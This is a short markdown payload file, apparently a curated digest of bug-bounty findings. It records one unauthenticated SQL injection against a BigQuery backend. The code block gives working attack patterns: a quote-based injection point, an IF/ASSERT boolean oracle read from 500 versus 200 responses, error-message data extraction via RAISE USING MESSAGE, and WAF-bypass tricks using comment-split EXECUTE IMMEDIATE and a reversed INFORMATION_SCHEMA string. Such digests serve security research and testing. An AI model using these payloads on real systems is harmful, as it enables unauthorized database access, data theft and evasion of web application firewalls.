# Payloads — sqli

_Verbatim payload / request patterns extracted from findings in this repo. Nothing invented._

## 1. Unauthenticated BigQuery SQLi via WAF-bypassing error-channel extraction ($4,000)
- Researcher: @infinitelogins
- Post: https://x.com/infinitelogins/status/2110355630133322159
- Sources: `posts/infinitelogins/2026-10-14-2110355630133322159.md`

```
JSON param with `'`; boolean: `IF TRUE THEN ASSERT FALSE; END IF;` → 500 vs FALSE → 200; extract: `RAISE USING MESSAGE = <query result>`; WAF bypass: `EXECUTE/**/IMMEDIATE` and `REVERSE('AMEHCS_NOITAMROFNI')`
```
